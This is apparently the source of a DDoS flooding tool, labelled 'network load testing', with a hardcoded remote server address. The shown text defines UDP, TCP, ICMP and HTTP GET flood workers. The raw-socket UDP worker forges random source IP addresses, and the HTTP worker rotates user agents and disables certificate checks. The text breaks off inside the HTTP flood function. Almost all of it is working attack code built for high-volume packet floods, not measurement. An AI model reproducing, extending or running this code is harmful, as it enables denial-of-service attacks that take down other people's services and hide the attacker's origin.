#!/usr/bin/env python3
import socket,json,threading,time,sys,multiprocessing as mp,struct,ssl,random
from urllib.parse import urlparse
S="144.172.94.208";P=2016
UA=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36','Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101']
print("network load testing ")
def wu(i,p,d,e,q):
 s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 try:s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
 except:0
 s.setblocking(0);t=(i,p);f=s.sendto;c=0
 while time.time()<e:
  try:
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   c+=1000
  except:0
 s.close();q.put(c)
def wub(i,p,d,e,q):
 raw=0
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_UDP)
  s.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
  raw=1
 except:
  s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 try:s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
 except:0
 s.setblocking(0);c=0;dipb=socket.inet_aton(i)
 def iph(sip,dip,udplen):
  vhl=0x45;tos=0;iplen=20+udplen;id=random.randint(1,65535);fl=0;ttl=64;pr=17
  sipb=socket.inet_aton(sip)
  ph=sipb+dipb+b'\x00'+bytes([pr])+struct.pack('!H',udplen)
  ch=sum(struct.unpack('!10H',ph))&0xffff
  ch=(ch>>16)+(ch&0xffff);ch=~ch&0xffff
  return struct.pack('!BBHHHBBH4s4s',vhl,tos,iplen,id,fl,ttl,pr,ch,sipb,dipb)
 def udph(sp,dp,pl):
  sp=random.randint(1024,65535)
  udplen=8+pl;chk=0
  return struct.pack('!HHHH',sp,dp,udplen,chk)
 while time.time()<e:
  try:
   sip=f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
   pl=len(d);udp=udph(0,p,pl);udplen=8+pl
   if raw:
    ip=iph(sip,i,udplen);pkt=ip+udp+d;f=s.sendto;f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
    f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0));f(pkt,(i,0))
   else:
    t=(i,p);f=s.sendto;f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
    f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   c+=100
  except:0
 s.close();q.put(c)
def wt(i,p,d,e,q):
 c=0
 while time.time()<e:
  try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
   try:s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
   except:0
   s.settimeout(2)
   try:s.connect((i,p))
   except:continue
   f=s.sendall
   while time.time()<e:
    try:
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d);f(d)
     c+=750
    except:break
   try:s.close()
   except:0
  except:0
 q.put(c)
def ck(d):
 s=0
 for i in range(0,len(d),2):s+=(d[i]<<8)+(d[i+1]if i+1<len(d)else 0)
 while s>>16:s=(s&0xFFFF)+(s>>16)
 return ~s&0xFFFF
def wi(i,d,e,q):
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
  s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912)
  s.setblocking(0)
 except:
  try:
   s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912);s.setblocking(0)
  except:q.put(0);return
 t=(i,0);f=s.sendto;c=0
 while time.time()<e:
  try:
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t);f(d,t)
   c+=500
  except:0
 s.close();q.put(c)
def wh(url,h,p,pt,us,e,q):
 c=0;ctx=ssl.create_default_context()if us else None
 if ctx:ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
 while time.time()<e:
  try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(3);s.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF,536870912);s.connect((h,p))
   if us:s=ctx.wrap_socket(s,server_hostname=h)
   r=f"GET {pt}?{random.randint(1,999999)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(UA)}\r\nAccept: */*\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n".encode()
   f=s.send
   while time.time()<e:
    try:
